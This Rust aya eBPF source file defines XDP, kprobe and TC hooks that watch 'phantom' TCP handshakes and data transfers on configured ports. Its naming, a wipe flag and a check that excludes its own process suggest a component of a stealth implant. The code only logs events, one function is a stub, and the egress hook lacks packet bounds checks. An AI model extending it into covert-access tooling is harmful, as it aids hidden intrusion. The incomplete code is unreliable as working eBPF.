use aya_ebpf::{
    bindings::xdp_action,
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns},
    macros::{classifier, kprobe, xdp},
    programs::{TcContext, XdpContext},
};
use common::{
    EventHeader, EVENT_PHANTOM_CONN_ESTABLISHED, EVENT_PHANTOM_DATA_XFER, EVENT_PHANTOM_SYN_ACK,
};

use crate::maps::*;

// ──────────────────────────────────────────────
// FEATURE 55: Phantom TCP SYN/ACK Handler (XDP)
// ──────────────────────────────────────────────

#[xdp]
pub fn shadow_phantom_ingress(ctx: XdpContext) -> u32 {
    try_phantom_ingress(&ctx).unwrap_or(xdp_action::XDP_PASS)
}

fn try_phantom_ingress(ctx: &XdpContext) -> Result<u32, i64> {
    let data = ctx.data();
    let data_end = ctx.data_end();

    if data + 54 > data_end {
        return Ok(xdp_action::XDP_PASS);
    }

    let eth_proto = unsafe { *((data + 12) as *const u16) };
    if eth_proto != 0x0008 {
        return Ok(xdp_action::XDP_PASS);
    }

    let ip_proto = unsafe { *((data + 23) as *const u8) };
    if ip_proto != 6 {
        return Ok(xdp_action::XDP_PASS);
    }

    let dst_port = unsafe { *((data + 36) as *const u16) };
    let dst_port_be = u16::from_be(dst_port);

    if unsafe { PHANTOM_LISTEN_PORTS.get(&dst_port_be) }.is_none() {
        return Ok(xdp_action::XDP_PASS);
    }

    let tcp_flags = unsafe { *((data + 47) as *const u8) };
    let syn = tcp_flags & 0x02 != 0;
    let ack = tcp_flags & 0x10 != 0;

    if syn && !ack {
        let event = EventHeader {
            event_type: EVENT_PHANTOM_SYN_ACK,
            pid: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: dst_port_be as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    if ack && !syn {
        let src_ip = unsafe { *((data + 26) as *const u32) };
        let src_port = unsafe { *((data + 34) as *const u16) };
        let conn_key = (u32::from_be(src_ip) as u64) << 32 | u16::from_be(src_port) as u64;

        if unsafe { PHANTOM_CONNS.get(&conn_key) }.is_some() {
            let event = EventHeader {
                event_type: EVENT_PHANTOM_CONN_ESTABLISHED,
                pid: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: conn_key,
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(xdp_action::XDP_PASS)
}

// ──────────────────────────────────────────────
// FEATURE 56: Phantom Connection State Machine
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_phantom_state(ctx: aya_ebpf::programs::ProbeContext) -> u32 {
    try_phantom_state(&ctx).unwrap_or_default()
}

fn try_phantom_state(_ctx: &aya_ebpf::programs::ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 57: Phantom Data Transfer (TC Egress)
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_phantom_egress(ctx: TcContext) -> i32 {
    try_phantom_egress(&ctx).unwrap_or(0)
}

fn try_phantom_egress(ctx: &TcContext) -> Result<i32, i64> {
    let eth_proto = u16::from_be(unsafe { *((ctx.data() + 12) as *const u16) });
    if eth_proto != 0x0800 {
        return Ok(0);
    }

    let ip_hdr = ctx.data() + 14;
    let protocol: u8 = unsafe { *((ip_hdr + 9) as *const u8) };
    if protocol != 6 {
        return Ok(0);
    }

    let ihl = (unsafe { *(ip_hdr as *const u8) } & 0x0F) as usize * 4;
    let tcp_hdr = ip_hdr + ihl;
    let dst_port = u16::from_be(unsafe { *((tcp_hdr + 2) as *const u16) });

    if unsafe { PHANTOM_LISTEN_PORTS.get(&dst_port) }.is_some() {
        let event = EventHeader {
            event_type: EVENT_PHANTOM_DATA_XFER,
            pid: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: dst_port as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}
